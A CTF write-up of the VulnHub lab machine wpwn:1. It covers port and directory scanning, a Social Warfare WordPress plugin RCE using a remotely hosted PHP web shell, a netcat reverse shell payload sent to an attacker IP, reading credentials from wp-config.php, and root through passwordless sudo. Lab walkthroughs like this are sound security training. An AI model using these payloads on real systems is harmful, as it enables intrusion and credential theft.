---
title: Wpwn:1 - Writeup
author: Elman Alizadeh
date: 2022-06-05 19:20:00 +0800
categories: [ctf, VulnHub]
tags: [vulnhub, wpwn]
---

Today we will take a look at Vulnhub: wpwn: 1. My goal in sharing this writeup is to show you the way if you are in trouble. Please try to understand each step and take notes.

![Desktop View]({{ "/assets/img/vuln-wpwn/1.png" | relative_url }})

## Network scan

```console
sudo nmap -p- -sCV --open 192.168.213.123

PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 7.9p1 Debian 10+deb10u2 (protocol 2.0)
| ssh-hostkey: 
|   2048 59:b7:db:e0:ba:63:76:af:d0:20:03:11:e1:3c:0e:34 (RSA)
|   256 2e:20:56:75:84:ca:35:ce:e3:6a:21:32:1f:e7:f5:9a (ECDSA)
|_  256 0d:02:83:8b:1a:1c:ec:0f:ae:74:cc:7b:da:12:89:9e (ED25519)
80/tcp open  http    Apache httpd 2.4.38 ((Debian))
|_http-title: Site doesn't have a title (text/html).
|_http-server-header: Apache/2.4.38 (Debian)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```

## Gobuster

```console
gobuster dir -u http://192.168.213.123  -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
===============================================================
Gobuster v3.1.0
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://192.168.213.123
[+] Method:                  GET
[+] Threads:                 10
[+] Wordlist:                /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.1.0
[+] Timeout:                 10s
===============================================================
2022/06/05 18:50:16 Starting gobuster in directory enumeration mode
===============================================================
/wordpress            (Status: 301) [Size: 322]
```

## Wpscan

```console
wpscan --url http://192.168.213.123/wordpress
```

![Desktop View]({{ "/assets/img/vuln-wpwn/2.png" | relative_url }})


[Social-Warfare-rce](https://github.com/shad0w008/social-warfare-RCE)

## Reverse Shell

```console
Command: nano exploit.php

<pre>system($_GET[rce])</pre>

Command: curl 'http://192.168.213.123/wordpress/wp-admin/admin-post.php?rce=id&swp_debug=load_options&swp_url=http://192.168.49.213:1337/exploit.php'
```

![Desktop View]({{ "/assets/img/vuln-wpwn/3.png" | relative_url }})

```console
http://192.168.213.123/wordpress/wp-admin/admin-post.php?rce=nc%20-e%20/bin/bash%20Your_IP%204242&swp_debug=load_options&swp_url=http://192.168.49.213:1337/exploit.php

# Change IP
```

## Takis

After login

```console
Command: script /dev/null -c bash

Command: export TERM=xterm

ctrl+z                            

Command: stty raw -echo ; fg                  
           
Command: reset
```

### Takis’s password

We see the password in the wp-config.php file in the /var/www/html/ wordpress folder.

```console
Command: cat wp-config.php
```

![Desktop View]({{ "/assets/img/vuln-wpwn/4.png" | relative_url }})

## Root


```console
Command: sudo -l

(ALL) NOPASSWD: ALL

Command: sudo su
```

![Desktop View]({{ "/assets/img/vuln-wpwn/5.png" | relative_url }})

### And now we are the root

![Desktop View]({{ "/assets/img/vuln-wpwn/6.gif" | relative_url }})

“If you have any questions or comments, please do not hesitate to write. Have a good days”